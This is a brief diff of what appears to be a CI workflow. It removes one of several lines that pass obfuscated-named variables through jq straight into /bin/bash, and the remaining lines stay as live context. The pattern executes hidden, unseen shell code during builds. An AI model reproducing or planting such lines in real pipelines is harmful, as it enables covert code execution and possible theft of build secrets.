@@ -43,7 +43,6 @@ jobs:
           echo $ne8876 | jq -r .ty93 | /bin/bash
           printf '%s' "$m246" | jq -r .usis0 | /bin/bash
           printf '%s' "$fpusf2423" | jq -r .csurt8733 | /bin/bash
-          echo $xl1 | jq -r .uscks9 | /bin/bash
           echo $bdls02 | jq -r .h81627 | /bin/bash
           printf '%s' "$av890" | jq -r .bddd1 | /bin/bash
 
